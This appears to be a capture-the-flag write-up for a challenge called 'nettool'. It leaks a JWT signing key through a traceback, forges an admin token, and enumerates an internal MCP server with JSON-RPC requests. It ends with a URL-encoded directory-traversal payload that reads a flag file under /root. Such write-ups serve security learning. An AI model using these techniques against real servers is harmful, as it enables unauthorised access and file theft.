# nettool

## First, read the source code and find the guest login credentials. Log in as a guest.
![1765361838634-2ebbf5b7-6e05-46e6-9cfd-34559c04f4b1.png](./img/1765361838634-2ebbf5b7-6e05-46e6-9cfd-34559c04f4b1-699798.png)
Reading the source code reveals:

```shell
try:
    SECRET_KEY = "RDbiBrgdR#CrdZVW" if len(token) <= 2048 else base64.b64decode(token[:2048])
except Exception:
    raise HTTPException(
        status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
        detail=f"Token custom check failed: {traceback.format_exc()}"
        )
```

Here `traceback.format_exc()` will leak the source code, which also leaks the `SECRET_KEY`.

Try accessing `/admin/nettools` and pass a token with length greater than 2048 to cause decoding failure and leak the information.

![1765362139648-db06b4df-90de-4166-a866-2ec7729d8260.png](./img/1765362139648-db06b4df-90de-4166-a866-2ec7729d8260-910768.png)

## Then forge the admin's JWT using the `SECRET_KEY` to log in as admin
![1765362177562-800f9bb9-2854-4d3f-af2b-8db1200599fa.png](./img/1765362177562-800f9bb9-2854-4d3f-af2b-8db1200599fa-627480.png)

![1765362194728-638711fe-77a1-4eb7-a23a-c27652233262.png](./img/1765362194728-638711fe-77a1-4eb7-a23a-c27652233262-773893.png)

## Then scan the internal network ports and discover that port 9000 is open
![1765362232954-263b5395-c877-4963-9925-4ec1c8e4911d.png](./img/1765362232954-263b5395-c877-4963-9925-4ec1c8e4911d-876577.png)

Observing the packets, it's identified as a fastmcp framework's mcpserver.

Try to probe for information:

```shell
{
    "Accept": "application/json, text/event-stream",
    "Content-Type": "application/json"
}

{
    "method":"initialize",
    "params":{
        "protocolVersion":"2025-06-18",
        "capabilities":{},
        "clientInfo":{
            "name":"mcp",
            "version":"0.1.0"
        }
    },
    "jsonrpc":"2.0",
    "id":0
}
```

![1765426743292-bb5348b7-f5cd-4bbb-a49f-daf2adf96768.png](./img/1765426743292-bb5348b7-f5cd-4bbb-a49f-daf2adf96768-596807.png)

## notifications/initialized
```shell
{
    "Accept": "application/json, text/event-stream",
    "Content-Type": "application/json",
    "Mcp-Session-Id": "a7540ddd08254bb3a2d7a406992c58d3"
}

{
    "method":"notifications/initialized",
    "jsonrpc":"2.0"
}
```

![1765426784811-3b5ac604-e459-45a2-9992-e6857446805b.png](./img/1765426784811-3b5ac604-e459-45a2-9992-e6857446805b-746936.png)

## List tools
```shell
{
    "method":"tools/list",
    "jsonrpc":"2.0",
    "id":1
}
```

![1765426838361-e78b41a4-83b8-48e3-97f6-76d98cf34c45.png](./img/1765426838361-e78b41a4-83b8-48e3-97f6-76d98cf34c45-969778.png)

Found only one insignificant tool.

## Probe resources and prompts
```shell
{
    "method":"resources/list",
    "jsonrpc":"2.0",
    "id":1
}

{
    "method":"prompts/list",
    "jsonrpc":"2.0",
    "id":1
}
```

No information found in resources, but prompts contain information.

![1765426905559-451fe745-892b-4038-a9e5-bcbfe32f2da1.png](./img/1765426905559-451fe745-892b-4038-a9e5-bcbfe32f2da1-036714.png)

## Further examine prompts
```shell
{
    "method": "prompts/get",
    "params": {
        "name": "where_is_flag",
        "arguments": {
            "name": "aaa"
        }
    },
    "jsonrpc": "2.0",
    "id": 1
}
```

![1765426940445-436bbbe0-b163-47da-876c-f56e4aa48195.png](./img/1765426940445-436bbbe0-b163-47da-876c-f56e4aa48195-861895.png)

## Try to read templates
```shell
{
    "method": "resources/templates/list",
    "jsonrpc": "2.0",
    "id": 1
}
```

![1765426983290-f9cee314-2bfa-4bc3-8519-bff78b59dc8a.png](./img/1765426983290-f9cee314-2bfa-4bc3-8519-bff78b59dc8a-284777.png)

Indeed discovered that templates has a function to read file base64 content and there's a directory traversal vulnerability.

## Read the flag through directory traversal
```shell
{
    "method": "resources/read",
    "params": {
        "uri": "base64://tmp/%2e%2e%2f%2e%2e%2f%2e%2e%2f%72%6f%6f%74%2f%31%66%66%66%6c%6c%6c%61%61%61%67%67%67"
    },
    "jsonrpc": "2.0",
    "id": 1
}
```
